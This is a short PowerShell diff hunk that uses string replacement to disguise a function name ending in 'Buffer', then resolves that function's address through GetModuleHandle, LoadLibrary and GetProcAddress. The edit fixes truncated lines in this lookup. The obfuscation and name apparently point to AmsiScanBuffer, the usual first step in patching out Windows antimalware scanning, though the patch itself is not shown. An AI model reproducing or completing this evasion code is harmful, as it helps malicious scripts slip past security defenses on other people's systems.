@@ -60,6 +60,6 @@ $s3 = $s3.replace('hello','Bu')
 $s3 = $s3.replace(', ','ff')
 $s3 = $s3.replace('world','er')
 
-[IntPtr] $modBase = [NtHelpers]::GetModuleHa
-if ($modBase -eq [IntPtr]::Zero) { $modBase = [NtHelpers]::LoadLibrary($s1) }
-[IntPtr] $funcAddr = [NtHelpers]::GetProcAdd
+$modBase = [NtHelpers]::GetModuleHandle($s1)
+if (!$modBase) { $modBase = [NtHelpers]::LoadLibrary($s1) }
+$funcAddr = [NtHelpers]::GetProcAddress($modBase, $s2 + $s3)
